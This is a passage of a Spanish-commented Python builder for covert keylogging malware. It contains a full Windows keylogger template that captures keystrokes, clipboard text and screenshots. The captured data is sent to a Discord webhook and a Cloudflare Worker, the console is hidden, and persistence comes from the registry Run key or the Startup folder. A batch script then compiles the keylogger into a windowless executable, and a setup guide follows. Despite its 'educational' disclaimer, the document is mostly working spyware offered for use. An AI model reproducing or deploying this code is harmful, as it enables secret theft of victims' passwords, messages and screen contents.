}}

MACHINE_NAME = CONFIG["machine"]
WEBHOOK_URL = CONFIG["webhook"]
WORKER_URL = CONFIG["worker_url"]
STEALTH_MODE = CONFIG["stealth"]
SCREENSHOTS_ENABLED = CONFIG["screenshots"]
SCREENSHOT_INTERVAL = CONFIG["screenshot_interval"]
PERSISTENCE_ENABLED = CONFIG["persistence"]
CLIPBOARD_ENABLED = CONFIG["clipboard"]
HIDE_CONSOLE = CONFIG["hide_console"]

# ============================================
# CLASE PRINCIPAL - CON WORKER
# ============================================
class WindowsKeyloggerWorker:
    def __init__(self):
        self.running = True
        self.log_buffer = ""
        self.temp_dir = tempfile.gettempdir()
        self.log_file = os.path.join(self.temp_dir, f"winlog_{{MACHINE_NAME}}.tmp")
        self.screenshots_sent = 0
        
        # Mapeo de teclas especiales
        self.key_names = {{
            8: "[BACKSPACE]",
            9: "[TAB]",
            13: "[ENTER]",
            16: "[SHIFT]",
            17: "[CTRL]",
            18: "[ALT]",
            19: "[PAUSE]",
            20: "[CAPSLOCK]",
            27: "[ESC]",
            32: " ",
            33: "[PAGEUP]",
            34: "[PAGEDOWN]",
            35: "[END]",
            36: "[HOME]",
            37: "[LEFT]",
            38: "[UP]",
            39: "[RIGHT]",
            40: "[DOWN]",
            45: "[INSERT]",
            46: "[DELETE]",
            91: "[WIN]",
            92: "[WIN]",
            93: "[MENU]",
            112: "[F1]", 113: "[F2]", 114: "[F3]", 115: "[F4]",
            116: "[F5]", 117: "[F6]", 118: "[F7]", 119: "[F8]",
            120: "[F9]", 121: "[F10]", 122: "[F11]", 123: "[F12]",
            144: "[NUMLOCK]",
            145: "[SCROLLLOCK]",
            186: "[;]",
            187: "[=]",
            188: "[,]",
            189: "[-]",
            190: "[.]",
            191: "[/]",
            192: "[`]",
            219: "[[]",
            220: "[\\\\]",
            221: "[]]",
            222: "[']",
        }}
        
        # Solo mostrar si es visible
        self._show_initial_info()
    
    def _show_initial_info(self):
        """Muestra info inicial solo si es visible"""
        if not STEALTH_MODE and not HIDE_CONSOLE:
            print("="*60)
            print(f"   KEYLOGGER WINDOWS CON WORKER - {{MACHINE_NAME}}")
            print(f"   Worker URL: {{WORKER_URL}}")
            print("="*60)
            print("[INFO] Iniciando captura educativa...")
    
    def hide_console(self):
        """Oculta la consola en Windows"""
        if HIDE_CONSOLE:
            try:
                import ctypes
                whnd = ctypes.windll.kernel32.GetConsoleWindow()
                if whnd != 0:
                    ctypes.windll.user32.ShowWindow(whnd, 0)
            except:
                pass
    
    def log_message(self, message):
        """Log seguro para Windows"""
        if not STEALTH_MODE and not HIDE_CONSOLE:
            try:
                print(message)
            except:
                pass
    
    def start_keyboard_capture(self):
        """Captura de teclado para Windows"""
        try:
            from pynput import keyboard
            
            def on_press(key):
                try:
                    key_str = self._key_to_str(key)
                    self.log_buffer += key_str
                    
                    # Guardar en archivo local
                    timestamp = datetime.now().strftime("%H:%M:%S")
                    log_entry = f"[{{timestamp}}] {{key_str}}"
                    
                    with open(self.log_file, "a", encoding="utf-8") as f:
                        f.write(log_entry)
                    
                    if not STEALTH_MODE and not HIDE_CONSOLE and len(self.log_buffer) % 20 == 0:
                        self.log_message(f"[ACTIVO] Capturando... ({{len(self.log_buffer)}} chars)")
                    
                    if len(self.log_buffer) >= 100:
                        self._send_to_webhook()
                        
                except Exception:
                    pass
            
            def _key_to_str(self, key):
                """Convierte tecla pynput a string"""
                try:
                    if hasattr(key, 'char') and key.char:
                        return key.char
                    
                    # Teclas especiales
                    special_keys = {{
                        keyboard.Key.space: " ",
                        keyboard.Key.enter: "[ENTER]\\n",
                        keyboard.Key.backspace: "[BACKSPACE]",
                        keyboard.Key.tab: "[TAB]",
                        keyboard.Key.esc: "[ESC]",
                        keyboard.Key.ctrl_l: "[CTRL]",
                        keyboard.Key.ctrl_r: "[CTRL]",
                        keyboard.Key.alt_l: "[ALT]",
                        keyboard.Key.alt_r: "[ALT]",
                        keyboard.Key.shift_l: "[SHIFT]",
                        keyboard.Key.shift_r: "[SHIFT]",
                        keyboard.Key.cmd_l: "[WIN]",
                        keyboard.Key.cmd_r: "[WIN]",
                        keyboard.Key.up: "[UP]",
                        keyboard.Key.down: "[DOWN]",
                        keyboard.Key.left: "[LEFT]",
                        keyboard.Key.right: "[RIGHT]",
                        keyboard.Key.insert: "[INSERT]",
                        keyboard.Key.delete: "[DELETE]",
                        keyboard.Key.home: "[HOME]",
                        keyboard.Key.end: "[END]",
                        keyboard.Key.page_up: "[PAGEUP]",
                        keyboard.Key.page_down: "[PAGEDOWN]",
                        keyboard.Key.f1: "[F1]", keyboard.Key.f2: "[F2]",
                        keyboard.Key.f3: "[F3]", keyboard.Key.f4: "[F4]",
                        keyboard.Key.f5: "[F5]", keyboard.Key.f6: "[F6]",
                        keyboard.Key.f7: "[F7]", keyboard.Key.f8: "[F8]",
                        keyboard.Key.f9: "[F9]", keyboard.Key.f10: "[F10]",
                        keyboard.Key.f11: "[F11]", keyboard.Key.f12: "[F12]",
                        keyboard.Key.caps_lock: "[CAPSLOCK]",
                        keyboard.Key.num_lock: "[NUMLOCK]",
                        keyboard.Key.scroll_lock: "[SCROLLLOCK]",
                    }}
                    
                    return special_keys.get(key, f"[{{str(key).replace('Key.', '')}}]")
                    
                except:
                    return "[UNKNOWN]"
            
            self._key_to_str = _key_to_str.__get__(self)
            
            # Iniciar listener
            listener = keyboard.Listener(on_press=on_press)
            listener.daemon = True
            listener.start()
            
            self.log_message("[✓] Captura con pynput iniciada")
            
            # Mantener ejecución
            while self.running:
                time.sleep(0.1)
                
        except ImportError:
            self.log_message("[!] ERROR: Necesitas instalar pynput")
            self.log_message("[+] pip install pynput")
            sys.exit(1)
    
    def capture_clipboard_windows(self):
        """Captura del portapapeles en Windows"""
        if not CLIPBOARD_ENABLED:
            return
        
        last_clipboard = ""
        
        while self.running:
            try:
                import win32clipboard
                
                win32clipboard.OpenClipboard()
                
                try:
                    # Intentar obtener texto
                    if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_TEXT):
                        data = win32clipboard.GetClipboardData(win32clipboard.CF_TEXT)
                        
                        # Decodificar según la versión de Python
                        if isinstance(data, bytes):
                            current = data.decode('utf-8', errors='ignore')
                        else:
                            current = str(data)
                        
                        # Verificar si es nuevo contenido
                        if current and current.strip() and current != last_clipboard:
                            timestamp = datetime.now().strftime("%H:%M:%S")
                            clipboard_log = f"\\n[CLIPBOARD {{timestamp}}]\\n{{current[:500]}}\\n"
                            
                            self.log_message(f"[CLIPBOARD] Capturado: {{current[:50]}}...")
                            
                            # Guardar en archivo
                            with open(self.log_file, "a", encoding="utf-8") as f:
                                f.write(clipboard_log)
                            
                            # Añadir al buffer para webhook
                            self.log_buffer += f"\\n[CLIPBOARD] {{current[:200]}}..."
                            last_clipboard = current
                            
                except Exception:
                    pass
                
                finally:
                    win32clipboard.CloseClipboard()
                
            except ImportError:
                self.log_message("[!] win32clipboard no disponible. Instalar:")
                self.log_message("[+] pip install pywin32")
                break
            
            except Exception:
                pass
            
            # Esperar 2 segundos entre verificaciones
            time.sleep(2)
    
    def capture_screenshots_windows(self):
        """Captura screenshots en Windows y envía al Worker"""
        if not SCREENSHOTS_ENABLED:
            return
        
        try:
            import pyautogui
            
            counter = 0
            while self.running:
                time.sleep(SCREENSHOT_INTERVAL)
                counter += 1
                
                try:
                    # Capturar screenshot
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    filename = os.path.join(self.temp_dir, f"sc_{{MACHINE_NAME}}_{{timestamp}}_{{counter}}.png")
                    
                    screenshot = pyautogui.screenshot()
                    screenshot.save(filename)
                    
                    self.log_message(f"[SCREENSHOT] Capturado: {{filename}}")
                    
                    # Enviar al Cloudflare Worker
                    success = self.send_screenshot_to_worker(filename)
                    
                    # Eliminar archivo local después de enviar
                    try:
                        os.remove(filename)
                        self.log_message(f"[✓] Archivo local eliminado")
                    except:
                        self.log_message(f"[!] No se pudo eliminar archivo")
                    
                except Exception as e:
                    self.log_message(f"[!] Error en screenshot: {{str(e)}}")
                
        except ImportError:
            self.log_message("[!] pyautogui no instalado para screenshots")
    
    def send_screenshot_to_worker(self, filepath):
        """Envía un screenshot al Cloudflare Worker con múltiples métodos"""
        try:
            # Verificar que el archivo existe y tiene tamaño
            if not os.path.exists(filepath):
                self.log_message(f"[!] Archivo no existe: {{filepath}}")
                return False
            
            file_size = os.path.getsize(filepath)
            if file_size == 0:
                self.log_message(f"[!] Archivo vacío: {{filepath}}")
                return False
            
            self.log_message(f"[+] Enviando screenshot ({{file_size}} bytes) a Worker...")
            
            # Métodos de envío a probar
            methods_to_try = [
                ("multipart/form-data", self._send_screenshot_multipart),
                ("bytes directos", self._send_screenshot_bytes),
                ("base64", self._send_screenshot_base64),
            ]
            
            for method_name, method_func in methods_to_try:
                try:
                    self.log_message(f"[+] Probando método: {{method_name}}...")
                    if method_func(filepath):
                        self.screenshots_sent += 1
                        return True
                except Exception as e:
                    self.log_message(f"[!] Método {{method_name}} falló: {{str(e)[:100]}}")
            
            self.log_message("[!] Todos los métodos de envío fallaron")
            return False
            
        except Exception as e:
            self.log_message(f"[!] Error enviando al Worker: {{str(e)}}")
            return False
    
    def _send_screenshot_multipart(self, filepath):
        """Método 1: Multipart form-data"""
        with open(filepath, 'rb') as f:
            filename = os.path.basename(filepath)
            files = {{'file': (filename, f, 'image/png')}}
            
            # Headers adicionales
            headers = {{
                'X-Machine-Name': MACHINE_NAME,
                'X-Capture-Method': 'pyautogui',
                'X-Timestamp': datetime.now().isoformat()
            }}
            
            response = requests.post(WORKER_URL, files=files, headers=headers, timeout=30)
        
        if response.status_code in [200, 201, 202]:
            self.log_message(f"[✓] Screenshot enviado (multipart) - {{self.screenshots_sent + 1}} total")
            return True
        else:
            self.log_message(f"[!] Error multipart: {{response.status_code}} - {{response.text[:100]}}")
            return False
    
    def _send_screenshot_bytes(self, filepath):
        """Método 2: Bytes directos con headers"""
        with open(filepath, 'rb') as f:
            image_data = f.read()
        
        headers = {{
            'Content-Type': 'image/png',
            'Content-Length': str(len(image_data)),
            'X-Machine-Name': MACHINE_NAME,
            'X-Filename': os.path.basename(filepath),
            'X-Capture-Method': 'pyautogui',
            'X-Timestamp': datetime.now().isoformat()
        }}
        
        response = requests.post(WORKER_URL, data=image_data, headers=headers, timeout=30)
        
        if response.status_code in [200, 201, 202]:
            self.log_message(f"[✓] Screenshot enviado (bytes directos) - {{self.screenshots_sent + 1}} total")
            return True
        else:
            self.log_message(f"[!] Error bytes: {{response.status_code}}")
            return False
    
    def _send_screenshot_base64(self, filepath):
        """Método 3: Base64 encoding"""
        import base64
        
        with open(filepath, 'rb') as f:
            image_data = base64.b64encode(f.read()).decode('utf-8')
        
        payload = {{
            'image': image_data,
            'filename': os.path.basename(filepath),
            'machine': MACHINE_NAME,
            'method': 'pyautogui',
            'timestamp': datetime.now().isoformat(),
            'type': 'screenshot'
        }}
        
        headers = {{
            'Content-Type': 'application/json'
        }}
        
        response = requests.post(WORKER_URL, json=payload, headers=headers, timeout=30)
        
        if response.status_code in [200, 201, 202]:
            self.log_message(f"[✓] Screenshot enviado (base64) - {{self.screenshots_sent + 1}} total")
            return True
        else:
            self.log_message(f"[!] Error base64: {{response.status_code}}")
            return False
    
    def send_text_to_worker(self, text, data_type="keylog"):
        """Envía texto al Worker como backup"""
        try:
            # Cortar texto si es muy largo
            if len(text) > 10000:
                text = text[:10000] + "... [TRUNCATED]"
            
            payload = {{
                "text": text, 
                "machine": MACHINE_NAME,
                "type": data_type,
                "timestamp": datetime.now().isoformat(),
                "length": len(text)
            }}
            
            # Intentar diferentes formatos
            headers = {{'Content-Type': 'application/json'}}
            
            try:
                response = requests.post(WORKER_URL, json=payload, headers=headers, timeout=10)
            except:
                # Fallback a form-data
                response = requests.post(WORKER_URL, data=payload, timeout=10)
            
            if response.status_code in [200, 201, 202]:
                self.log_message(f"[✓] Texto enviado al Worker ({{data_type}})")
                return True
            else:
                self.log_message(f"[!] Error texto al Worker: {{response.status_code}}")
                return False
                
        except Exception as e:
            self.log_message(f"[!] Error enviando texto al Worker: {{str(e)}}")
            return False
    
    def _send_to_webhook(self):
        """Envía datos a webhook y Worker"""
        if not self.log_buffer or WEBHOOK_URL == "SIMULATION_MODE":
            return
        
        try:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            if len(self.log_buffer) > 1500:
                chunks = [self.log_buffer[i:i+1500] for i in range(0, len(self.log_buffer), 1500)]
                for i, chunk in enumerate(chunks):
                    # Enviar a Discord
                    if WEBHOOK_URL != "SIMULATION_MODE":
                        payload = {{
                            "content": f"**{{MACHINE_NAME}}** - {{timestamp}} ({{i+1}}/{{len(chunks)}})\\n```{{chunk}}```",
                            "username": "Windows Keylogger"
                        }}
                        try:
                            response = requests.post(WEBHOOK_URL, json=payload, timeout=5)
                            if response.status_code in [200, 201, 204]:
                                self.log_message(f"[✓] Chunk {{i+1}}/{{len(chunks)}} enviado a Discord")
                            else:
                                self.log_message(f"[!] Discord error: {{response.status_code}}")
                        except Exception as e:
                            self.log_message(f"[!] Error enviando chunk {{i+1}} a Discord: {{str(e)}}")
                    
                    # Enviar chunk al Worker también
                    self.send_text_to_worker(chunk, "discord_backup")
            else:
                # Enviar a Discord
                if WEBHOOK_URL != "SIMULATION_MODE":
                    payload = {{
                        "content": f"**{{MACHINE_NAME}}** - {{timestamp}}\\n```{{self.log_buffer}}```",
                        "username": "Windows Keylogger"
                    }}
                    try:
                        response = requests.post(WEBHOOK_URL, json=payload, timeout=5)
                        if response.status_code in [200, 201, 204]:
                            self.log_message("[✓] Datos enviados a Discord")
                        else:
                            self.log_message(f"[!] Discord error: {{response.status_code}}")
                    except Exception as e:
                        self.log_message(f"[!] Error enviando a Discord: {{str(e)}}")
                
                # Enviar todo al Worker también
                self.send_text_to_worker(self.log_buffer, "keylog")
            
            self.log_buffer = ""
                
        except Exception as e:
            self.log_message(f"[!] Error crítico en send_to_webhook: {{str(e)}}")
            
            # Intentar enviar solo al Worker si Discord falla
            try:
                error_msg = f"Error Discord: {{str(e)}}. Texto: {{self.log_buffer[:1000]}}"
                self.send_text_to_worker(error_msg, "error")
            except:
                pass
    
    def add_persistence_windows(self):
        """Añade persistencia en Windows"""
        if not PERSISTENCE_ENABLED:
            return
        
        try:
            import winreg
            
            # Obtener ruta actual
            if getattr(sys, 'frozen', False):
                exe_path = sys.executable
            else:
                exe_path = os.path.abspath(__file__)
            
            # Añadir al registro
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            
            try:
                reg_key = winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE)
                winreg.SetValueEx(reg_key, f"{{MACHINE_NAME}}_Monitor", 0, winreg.REG_SZ, exe_path)
                winreg.CloseKey(reg_key)
                
                self.log_message("[✓] Persistencia en registro configurada")
                    
            except:
                # Método alternativo: carpeta Startup
                startup_path = os.path.join(os.getenv('APPDATA'), 
                                          'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
                if os.path.exists(startup_path):
                    bat_path = os.path.join(startup_path, f"{{MACHINE_NAME}}.bat")
                    with open(bat_path, 'w') as f:
                        f.write(f'start /B "" "{{exe_path}}"')
                
                self.log_message("[✓] Persistencia en Startup configurada")
                
        except ImportError:
            pass
    
    def run(self):
        """Ejecuta el keylogger"""
        # Ocultar consola primero
        if HIDE_CONSOLE:
            self.hide_console()
        
        # Configurar persistencia
        if PERSISTENCE_ENABLED:
            self.add_persistence_windows()
        
        # Iniciar captura de teclado en thread
        keyboard_thread = threading.Thread(target=self.start_keyboard_capture)
        keyboard_thread.daemon = True
        keyboard_thread.start()
        
        # Thread para clipboard (si está activado)
        threads = []
        if CLIPBOARD_ENABLED:
            t = threading.Thread(target=self.capture_clipboard_windows)
            t.daemon = True
            t.start()
            threads.append(t)
        
        # Thread para screenshots (si está activado)
        if SCREENSHOTS_ENABLED:
            t = threading.Thread(target=self.capture_screenshots_windows)
            t.daemon = True
            t.start()
            threads.append(t)
        
        # Thread para enviar periódicamente
        def periodic_send():
            while self.running:
                time.sleep(60)
                if self.log_buffer:
                    self._send_to_webhook()
        
        t = threading.Thread(target=periodic_send)
        t.daemon = True
        t.start()
        threads.append(t)
        
        # Verificar Worker al inicio
        if not STEALTH_MODE and not HIDE_CONSOLE:
            self.test_worker_connection()
        
        if not STEALTH_MODE and not HIDE_CONSOLE:
            self.log_message("[+] Sistema activo. Presiona Ctrl+C para detener.")
        
        try:
            # Mantener el programa ejecutándose
            while self.running:
                time.sleep(1)
                
        except KeyboardInterrupt:
            if not STEALTH_MODE and not HIDE_CONSOLE:
                self.log_message("\\n[!] Deteniendo...")
            self.running = False
        
        # Limpiar al salir
        try:
            if os.path.exists(self.log_file):
                os.remove(self.log_file)
        except:
            pass
        
        if not STEALTH_MODE and not HIDE_CONSOLE:
            self.log_message("[+] Keylogger detenido")
    
    def test_worker_connection(self):
        """Prueba la conexión al Worker"""
        self.log_message("[+] Probando conexión al Worker...")
        try:
            test_payload = {{
                "test": True,
                "machine": MACHINE_NAME,
                "timestamp": datetime.now().isoformat(),
                "message": "Connection test from Windows keylogger"
            }}
            
            response = requests.post(WORKER_URL, json=test_payload, timeout=10)
            
            if response.status_code in [200, 201, 202]:
                self.log_message(f"[✓] Worker responde correctamente ({{response.status_code}})")
                return True
            else:
                self.log_message(f"[!] Worker error: {{response.status_code}} - {{response.text[:100]}}")
                return False
                
        except Exception as e:
            self.log_message(f"[!] No se puede conectar al Worker: {{str(e)}}")
            self.log_message("[!] Verifica: 1) URL correcta, 2) Internet, 3) Permisos Worker")
            return False

# ============================================
# ENTRY POINT
# ============================================
def main():
    """Punto de entrada principal"""
    # Marcar como educativo
    os.environ["EDUCATIONAL_PURPOSE"] = "true"
    
    # Ejecutar solo en Windows
    if os.name == 'nt':
        keylogger = WindowsKeyloggerWorker()
        keylogger.run()
    else:
        print("Este programa es solo para Windows")

if __name__ == "__main__":
    main()
'''
        
        filename = f"windows_keylogger_worker_{self.config['machine']}.py"
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(windows_code)
        
        print(f"[✓] Keylogger Windows con Worker creado: {filename}")
        
        # Crear batch file para compilar
        self.create_windows_compile_batch_worker_fixed(filename)
        
        return filename
    
    def create_windows_compile_batch_worker_fixed(self, python_file):
        """Crea un archivo .bat para compilar el keylogger con Worker"""
        bat_content = f'''@echo off
chcp 65001 > nul
cls
echo ========================================
echo  COMPILADOR KEYLOGGER CON WORKER
echo  VERSIÓN: Comparaciones int corregidas
echo ========================================
echo.

cd /d "%~dp0"

echo Verificando Python...
python --version
if errorlevel 1 (
    echo ERROR: Python no encontrado
    pause
    exit /b 1
)

echo.
echo Archivos disponibles:
dir *.py /b
echo.

:menu
echo ========================================
echo            MENU PRINCIPAL
echo ========================================
echo.
echo [1] Instalar TODAS las dependencias
echo [2] Compilar .exe (Consola OCULTA) - Recomendado
echo [3] Compilar .exe (Consola VISIBLE) - Debug
echo [4] Testear conexión al Worker
echo [5] Verificar código generado (comparaciones int)
echo [6] Salir
echo.
set /p opcion=Seleccione opcion [1-6]: 

if "%opcion%"=="1" goto instalar_todo
if "%opcion%"=="2" goto compilar_oculto
if "%opcion%"=="3" goto compilar_visible
if "%opcion%"=="4" goto test_worker
if "%opcion%"=="5" goto verificar_codigo
if "%opcion%"=="6" goto salir
echo Opcion invalida!
pause
goto menu

:instalar_todo
cls
echo ========================================
echo INSTALANDO DEPENDENCIAS COMPLETAS...
echo ========================================
echo.
echo Instalando PyInstaller...
python -m pip install --upgrade pip
pip install pyinstaller
echo.
echo Instalando dependencias básicas...
pip install pynput requests pyperclip
echo.
echo Instalando para screenshots Windows...
pip install pyautogui pillow pywin32
echo.
echo Instalando para screenshots Linux (mss)...
pip install mss
echo.
echo ¡Todas las dependencias instaladas!
echo.
echo CORRECCIÓN APLICADA:
echo • PREFERRED_CAPTURE_METHOD como entero (1,2,3,4)
echo • Comparaciones corregidas: == 4 en lugar de == "4"
pause
goto menu

:compilar_oculto
cls
echo ========================================
echo COMPILAR .EXE (CONSOLA OCULTA)
echo ========================================
echo.
set /p archivo=Nombre del archivo .py (sin .py): 
echo.
echo Compilando %archivo%.py...
echo ¡USANDO: python -m PyInstaller!
echo.
echo Características:
echo • Envía screenshots a: {self.config['worker_url']}
echo • Captura teclas y portapapeles
echo • Comparaciones corregidas (int)
echo.
python -m PyInstaller --onefile --noconsole --clean "%archivo%.py"
echo.
if exist "dist\\%archivo%.exe" (
    echo ¡EXITO! Archivo creado:
    echo dist\\%archivo%.exe
    echo.
    echo Tamaño: 
    for %%F in ("dist\\%archivo%.exe") do echo   %%~zF bytes
) else (
    echo ERROR: No se pudo crear el .exe
)
pause
goto limpiar

:compilar_visible
cls
echo ========================================
echo COMPILAR .EXE (CONSOLA VISIBLE)
echo ========================================
echo.
set /p archivo=Nombre del archivo .py (sin .py): 
echo.
echo Compilando %archivo%.py...
echo ¡USANDO: python -m PyInstaller!
echo.
echo MODO DEBUG - Consola visible
echo.
python -m PyInstaller --onefile --console --clean "%archivo%.py"
echo.
if exist "dist\\%archivo%.exe" (
    echo ¡EXITO! Archivo creado:
    echo dist\\%archivo%.exe
) else (
    echo ERROR: No se pudo crear el .exe
)
pause
goto limpiar

:test_worker
cls
echo ========================================
echo TESTEAR CONEXIÓN AL WORKER
echo ========================================
echo.
echo URL del Worker: {self.config['worker_url']}
echo.
echo Probando conexión...
python -c "
import requests
import json
from datetime import datetime

test_payload = {{
    'test': True,
    'machine': 'TEST_MACHINE',
    'timestamp': datetime.now().isoformat(),
    'message': 'Test connection from builder - Comparaciones int corregidas'
}}

try:
    response = requests.post('{self.config['worker_url']}', json=test_payload, timeout=10)
    print(f'Status Code: {{response.status_code}}')
    print(f'Response: {{response.text[:200]}}')
    if response.status_code in [200, 201, 202]:
        print('✅ Worker responde correctamente')
    else:
        print('❌ Worker error')
except Exception as e:
    print(f'❌ Error de conexión: {{str(e)}}')
"
echo.
pause
goto menu

:verificar_codigo
cls
echo ========================================
echo VERIFICAR CÓDIGO GENERADO
echo ========================================
echo.
echo Verificando que las comparaciones sean con enteros...
echo.
findstr /n "PREFERRED_CAPTURE_METHOD == \"" *.py
echo.
echo Si aparecen resultados arriba, hay comparaciones con strings (ERROR)
echo.
echo Verificando comparaciones correctas...
echo.
findstr /n "PREFERRED_CAPTURE_METHOD == [0-9]" *.py
echo.
echo Estos son los resultados CORRECTOS (comparaciones con enteros)
echo.
echo Verificando configuración...
echo.
python -c "
import json
try:
    with open('config_{self.config['machine']}.json', 'r') as f:
        config = json.load(f)
    print(f'Método captura: {{config.get(\"linux_capture_method\", \"NO DEFINIDO\")}}')
    print(f'Tipo: {{type(config.get(\"linux_capture_method\", 4))}}')
    if isinstance(config.get('linux_capture_method', 4), int):
        print('✅ Configuración correcta (int)')
    else:
        print('❌ Configuración incorrecta (no es int)')
except:
    print('No se encontró archivo de configuración')
"
echo.
pause
goto menu

:limpiar
cls
echo ========================================
echo LIMPIEZA DE ARCHIVOS TEMPORALES
echo ========================================
echo.
echo ¿Eliminar carpetas temporales? (S/N)
set /p respuesta=

if /i "%respuesta%"=="S" (
    echo Eliminando archivos temporales...
    rmdir /s /q build 2>nul
    del *.spec 2>nul
    echo ¡Limpieza completada!
) else (
    echo Archivos temporales preservados.
)
pause
goto menu

:salir
cls
echo ========================================
echo       PROCESO FINALIZADO
echo ========================================
echo.
echo Resumen:
echo - Scripts generados con comparaciones corregidas (int)
echo - Método captura: {self.config['linux_capture_method']} (entero)
echo - Worker URL: {self.config['worker_url']}
echo.
echo Presione cualquier tecla para salir...
pause > nul
exit
'''
        
        bat_filename = f"COMPILAR_FIXED_INT_{self.config['machine']}.bat"
        with open(bat_filename, 'w', encoding='utf-8') as f:
            f.write(bat_content)
        
        print(f"[✓] Batch file para Worker (int) creado: {bat_filename}")
        return bat_filename
    
    def create_installation_guide_fixed_int(self):
        """Crea una guía completa de instalación con las correcciones int"""
        guide = f'''GUÍA COMPLETA - KEYLOGGER LINUX/WINDOWS CORREGIDO (INT) {self.config['machine']}
==========================================================================
FECHA: {self.config['date']}
AUTOR: {self.config['author']}
VERSIÓN: COMPARACIONES CON ENTEROS CORREGIDAS (int vs str)

⚠️ CORRECCIÓN CRÍTICA APLICADA:
==============================
PROBLEMA: Se comparaba PREFERRED_CAPTURE_METHOD con strings ("4") en lugar de enteros (4)
SOLUCIÓN: Todas las comparaciones ahora son con enteros:
• if PREFERRED_CAPTURE_METHOD == 1 or PREFERRED_CAPTURE_METHOD == 4:
• if PREFERRED_CAPTURE_METHOD in [1, 4]: (también válido)

ARCHIVOS GENERADOS:
==================

1. PARA LINUX (VERSIÓN CORREGIDA - INT):
   --------------------------------------
   • linux_keylogger_fixed_int_{self.config['machine']}.py
     - Script Python con comparaciones CORREGIDAS (enteros)
     - PREFERRED_CAPTURE_METHOD = {self.config['linux_capture_method']} (como ENTERO)
   
   • install_linux_int_{self.config['machine']}.sh
     - Script de instalación con verificación de tipo

2. PARA WINDOWS:
   --------------
   • windows_keylogger_worker_{self.config['machine']}.py
     - Keylogger Windows con Worker
   
   • COMPILAR_FIXED_INT_{self.config['machine']}.bat
     - Batch file con verificación de código

VERIFICACIÓN DE LA CORRECCIÓN:
=============================
Para verificar que el código está corregido:

1. Buscar comparaciones incorrectas (strings):
   grep -n "PREFERRED_CAPTURE_METHOD == \\"" linux_keylogger_fixed_int_*.py
   → NO DEBE HABER RESULTADOS

2. Buscar comparaciones correctas (enteros):
   grep -n "PREFERRED_CAPTURE_METHOD == [0-9]" linux_keylogger_fixed_int_*.py
   → DEBE MOSTRAR LAS COMPARACIONES

3. Verificar el valor en el código:
   PREFERRED_CAPTURE_METHOD = {self.config['linux_capture_method']}
   → Sin comillas, es un ENTERO

INSTRUCCIONES DETALLADAS - LINUX:
================================

1. INSTALAR DEPENDENCIAS:
   ----------------------
   chmod +x install_linux_int_{self.config['machine']}.sh
   sudo ./install_linux_int_{self.config['machine']}.sh

   O manualmente:
   pip3 install pynput requests pyperclip mss
   sudo apt-get install scrot

2. EJECUTAR EN MODO DEBUG PRIMERO:
   --------------------------------
   # Temporalmente cambia STEALTH_MODE = False en el script
   # O usa este comando para forzar modo debug:
   python3 -c "
   import subprocess
   result = subprocess.run(['python3', 'linux_keylogger_fixed_int_{self.config['machine']}.py'], 
                          capture_output=True, text=True)
   print('Salida:', result.stdout)
   print('Errores:', result.stderr)
   "

3. VERIFICAR COMPARACIONES:
   ------------------------
   python3 -c "
   with open('linux_keylogger_fixed_int_{self.config['machine']}.py', 'r') as f:
       content = f.read()
   
   # Buscar definición
   import re
   match = re.search(r'PREFERRED_CAPTURE_METHOD = (\\\\d+)', content)
   if match:
       print(f'Valor encontrado: {{match.group(1)}}')
       print(f'Tipo correcto: {{match.group(1).isdigit()}}')
   
   # Contar comparaciones correctas
   int_comparisons = re.findall(r'PREFERRED_CAPTURE_METHOD == \\\\d+', content)
   str_comparisons = re.findall(r'PREFERRED_CAPTURE_METHOD == \\\"\\\\d+\\\"', content)
   
   print(f'Comparaciones con enteros: {{len(int_comparisons)}}')
   print(f'Comparaciones con strings: {{len(str_comparisons)}}')
   
   if len(str_comparisons) == 0:
       print('✅ Todas las comparaciones son con enteros')
   else:
       print('❌ Hay comparaciones con strings')
   "

INSTRUCCIONES DETALLADAS - WINDOWS:
==================================

1. COMPILAR CON .BAT CORREGIDO:
   ----------------------------
   Ejecutar como Administrador:
   COMPILAR_FIXED_INT_{self.config['machine']}.bat

   Opción [5] verifica automáticamente las comparaciones.

2. VERIFICAR CÓDIGO GENERADO:
   --------------------------
   El batch file incluye verificación:
   • Busca comparaciones con strings (debe encontrar 0)
   • Busca comparaciones con enteros (debe encontrar varias)
   • Verifica el tipo en la configuración JSON

SOLUCIÓN DE PROBLEMAS:
=====================

1. "El script no captura screenshots":
   → Verifica que PREFERRED_CAPTURE_METHOD sea entero
   → Ejecuta en modo debug: STEALTH_MODE = False
   → Instala mss: pip install mss

2. "Comparaciones aún fallan":
   → Asegúrate de usar el archivo _int_ en el nombre
   → linux_keylogger_fixed_int_{self.config['machine']}.py
   → No el archivo viejo sin la corrección

3. "Error al compilar":
   → Usa el batch file nuevo: COMPILAR_FIXED_INT_{self.config['machine']}.bat
   → Incluye verificación de código

CÓDIGO DE EJEMPLO CORRECTO:
==========================
# INCORRECTO (viejo):
if PREFERRED_CAPTURE_METHOD == "4":

# CORRECTO (nuevo):
if PREFERRED_CAPTURE_METHOD == 4:

# INCORRECTO (viejo):
if PREFERRED_CAPTURE_METHOD in ["1", "4"]:

# CORRECTO (nuevo):
if PREFERRED_CAPTURE_METHOD == 1 or PREFERRED_CAPTURE_METHOD == 4:
# O también:
if PREFERRED_CAPTURE_METHOD in [1, 4]:

CONFIGURACIÓN ACTUAL:
====================
• Máquina: {self.config['machine']}
• Worker URL: {self.config['worker_url']}
• Método captura: {self.config['linux_capture_method']} (ENTERO)
• Tipo verificado: int
• Comparaciones: ✅ Corregidas (enteros)
• Archivo Linux: linux_keylogger_fixed_int_{self.config['machine']}.py
• Batch file: COMPILAR_FIXED_INT_{self.config['machine']}.bat

ARCHIVOS DISPONIBLES:
====================
• linux_keylogger_fixed_int_{self.config['machine']}.py - Código corregido
• install_linux_int_{self.config['machine']}.sh - Instalador
• windows_keylogger_worker_{self.config['machine']}.py - Windows
• COMPILAR_FIXED_INT_{self.config['machine']}.bat - Compilador con verificación
• config_{self.config['machine']}.json - Configuración (verificar tipo)

⚠️ ADVERTENCIA LEGAL:
===================
ESTE SOFTWARE ES EXCLUSIVAMENTE PARA:
• Educación en ciberseguridad
• Pruebas en sistemas propios
• Laboratorios controlados

NUNCA usar en sistemas sin autorización explícita.
